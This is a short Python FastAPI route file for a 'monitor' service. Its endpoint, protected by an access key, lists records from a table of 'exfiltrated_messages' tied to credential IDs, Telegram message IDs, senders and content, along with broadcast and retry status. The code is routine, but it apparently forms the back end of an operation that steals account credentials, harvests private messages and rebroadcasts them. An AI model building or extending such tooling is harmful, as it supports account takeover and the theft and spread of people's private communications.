"""Monitor messages resource routes."""

from .common import *

router = APIRouter()

@router.get("/messages", response_model=list[MessageOut])
async def list_messages(limit: int = 100):
    """List recent exfiltrated messages. Requires X-Monitor-Key header."""
    limit = max(1, min(limit, 1000))  # Clamp to [1, 1000]
    try:
        res = await execute_async(
            db.table("exfiltrated_messages")
            .select("id,credential_id,telegram_msg_id,sender_name,content,media_type,is_broadcasted,broadcast_error,broadcast_attempts,next_retry_at,created_at")
            .order("created_at", desc=True)
            .limit(limit)
        )
        return res.data
    except Exception as exc:
        logger.exception("monitor/messages query failed")
        raise HTTPException(status_code=500, detail="Internal error") from exc
